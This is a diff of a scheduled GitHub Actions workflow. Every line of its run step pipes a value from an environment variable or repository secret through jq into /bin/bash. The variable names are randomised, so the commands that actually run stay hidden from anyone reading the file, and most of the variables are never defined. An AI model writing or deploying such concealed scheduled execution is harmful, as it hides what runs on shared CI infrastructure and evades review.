@@ -3,32 +3,26 @@ name: huangyunxiao7461
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 3/6 * * *'
+    - cron: '50 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huangyunxiao7461
         env:
-          dyl767: ${{ secrets.dyl767 }}
+          qmfh82: ${{ secrets.qmfh82 }}
         run: |
-          echo $dyl767 | jq -r .cli65 | /bin/bash
-          echo $mnc81 | jq -r .tv54 | /bin/bash
-          echo $t5818 | jq -r .iklxm380 | /bin/bash
-          echo $x6 | jq -r .hn13 | /bin/bash
-          echo $vz04 | jq -r .tooor0927 | /bin/bash
-          echo $ukup33797 | jq -r .yc7733 | /bin/bash
-          echo $nsdp1 | jq -r .yw03 | /bin/bash
-          echo $cmu789 | jq -r .cwrtq4549 | /bin/bash
-          echo $oi788 | jq -r .nhrx7573 | /bin/bash
-          echo $o03884 | jq -r .qh45 | /bin/bash
-          echo $decm788 | jq -r .worx756 | /bin/bash
-          echo $zox365 | jq -r .oja73 | /bin/bash
-          echo $byf8 | jq -r .a5776 | /bin/bash
-          echo $xw34601 | jq -r .uhwse15 | /bin/bash
-          echo $tvn8 | jq -r .opc4052 | /bin/bash
-          echo $qknj5 | jq -r .lst6840 | /bin/bash
-          echo $oq964 | jq -r .i80328 | /bin/bash
-          echo $uhc61732 | jq -r .k90 | /bin/bash
+          echo $qmfh82 | jq -r .vk833 | /bin/bash
+          echo $snbta4 | jq -r .vz67634 | /bin/bash
+          echo $mz11874 | jq -r .dsz0117 | /bin/bash
+          echo $exrde2 | jq -r .bhk437 | /bin/bash
+          echo $klw12 | jq -r .uym64 | /bin/bash
+          echo $ymx4978 | jq -r .opvpz50 | /bin/bash
+          echo $zkg19457 | jq -r .arxxg78 | /bin/bash
+          echo $zvp6 | jq -r .vw931 | /bin/bash
+          echo $zj8 | jq -r .cq43094 | /bin/bash
+          echo $nmc2327 | jq -r .evn10137 | /bin/bash
+          echo $eipl436 | jq -r .ahue8940 | /bin/bash
 
